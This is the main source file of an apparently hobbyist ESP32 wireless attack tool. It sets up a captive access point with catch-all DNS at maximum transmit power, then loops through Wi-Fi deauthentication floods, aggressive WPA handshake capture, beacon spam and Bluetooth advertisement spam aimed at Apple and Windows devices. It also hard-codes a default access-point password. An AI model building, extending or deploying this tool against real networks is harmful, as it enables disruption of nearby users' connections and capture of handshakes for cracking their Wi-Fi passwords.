#include "config.h"
#include "web_interface.h"
#include "attacks.h"

Preferences preferences;

void loadAPSettings() {
  preferences.begin("wifi-tool", false);
  MAIN_SSID = preferences.getString("ssid", "Durgesh ko bhai Hagess");
  MAIN_PASS = preferences.getString("pass", "Bruh1234@#");
  preferences.end();
  Serial.println("Loaded AP: " + MAIN_SSID);
}

void saveAPSettings() {
  preferences.begin("wifi-tool", false);
  preferences.putString("ssid", MAIN_SSID);
  preferences.putString("pass", MAIN_PASS);
  preferences.end();
  Serial.println("Saved AP: " + MAIN_SSID);
}

void setup() {
  Serial.begin(115200);
  
  // Load saved AP settings
  loadAPSettings();
  
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  if (!WiFi.softAP(MAIN_SSID.c_str(), MAIN_PASS.c_str())) {
    Serial.println("[ERROR] Failed to start main AP on boot");
  } else {
    Serial.println("Main AP started: " + MAIN_SSID);
  }
  esp_wifi_set_max_tx_power(78);
  Serial.println("TX power set to max");
  
  dnsServer.start(DNS_PORT, "*", APIP);
  setupWebServer();
  Serial.println("Tool started at 192.168.4.1");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  
  if (attackActive) {
    if (millis() - lastAttackTime >= ATTACK_INTERVAL) {
      sendDeauthPackets();
      lastAttackTime = millis();
    }
  }

  // Check passive handshake 80s timer
  if (handshakeCapture) {
    if (handshakeComplete || (millis() - handshakeStartTime >= 80000)) {
      stopHandshakeCapture();
    }
  }

  // Check aggressive handshake auto-stop on complete
  if (aggressiveHandshake) {
    if (handshakeComplete) {
      stopAggressiveHandshake();
    } else if (millis() - lastAttackTime >= ATTACK_INTERVAL) {
      sendDeauthPackets();
      lastAttackTime = millis();
    }
  }

  if (beaconSpamActive) {
    if (millis() - lastBeaconTime >= 100) {
      sendBeaconSpam();
      lastBeaconTime = millis();
    }
  }

  if (sourAppleActive) {
    NimBLEAdvertisementData advertisementData = getSourAppleData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(10);
    pAdvertising->stop();
    delay(5);
  }

  if (windowsBluetoothActive) {
    NimBLEAdvertisementData advertisementData = getWindowsBluetoothData();
    pAdvertising->setAdvertisementData(advertisementData);
    pAdvertising->start();
    delay(100);
    pAdvertising->stop();
    delay(50);
  }
}
